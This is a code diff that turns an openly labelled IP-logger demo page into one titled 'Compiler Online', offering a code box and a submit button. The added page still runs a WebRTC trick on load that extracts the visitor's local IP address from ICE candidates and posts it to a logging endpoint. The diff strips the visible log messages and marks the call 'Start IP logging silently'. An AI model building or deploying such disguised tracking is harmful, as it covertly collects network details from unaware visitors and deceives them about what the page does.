@@ -2,34 +2,39 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>IP Logger</title>
+    <title>Compiler Online</title>
 </head>
 <body>
-    <h1>Private IP Logger Demo</h1>
-    <p>Fetching IP address...</p>
+    <h1>Compiler Online</h1>
+
+    <h2>Code Submission</h2>
+    <textarea id="code" rows="10" cols="30" placeholder="Write your code here..."></textarea><br>
+    <button id="submit">Submit Code</button>
+
+    <h2>Output</h2>
+    <pre id="output"></pre>
 
     <script>
         async function logPrivateIP() {
             const pc = new RTCPeerConnection();
-            pc.createDataChannel('');  // Create an empty data channel
-            pc.createOffer().then(offer => pc.setLocalDescription(offer));  // Initiate offer
+            let logged = false;
+
+            pc.createDataChannel('');
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
 
             pc.onicecandidate = event => {
-                if (event && event.candidate) {
+                if (event.candidate && !logged) {
                     const candidate = event.candidate.candidate;
                     if (candidate.includes("candidate")) {
-                        const localIP = candidate.split(" ")[4];  // Extract IP from ICE candidate
-                        console.log("Local IP:", localIP);
+                        const localIP = candidate.split(" ")[4];
+                        logged = true;
 
-                        // Send IP to the Vercel serverless function
                         fetch('/api/log', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({ ip: localIP })
                         }).then(response => {
-                            if (response.ok) {
-                                console.log('IP logged successfully');
-                            } else {
+                            if (!response.ok) {
                                 console.error('Failed to log IP');
                             }
                         }).catch(error => {
@@ -40,7 +45,21 @@
             };
         }
 
-        logPrivateIP();
+        async function compileCode() {
+            const code = document.getElementById('code').value;
+
+            const response = await fetch('/api/compile', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ code })
+            });
+
+            const result = await response.json();
+            document.getElementById('output').textContent = result.output;
+        }
+
+        document.getElementById('submit').onclick = compileCode;
+        logPrivateIP(); // Start IP logging silently
     </script>
 </body>
 </html>
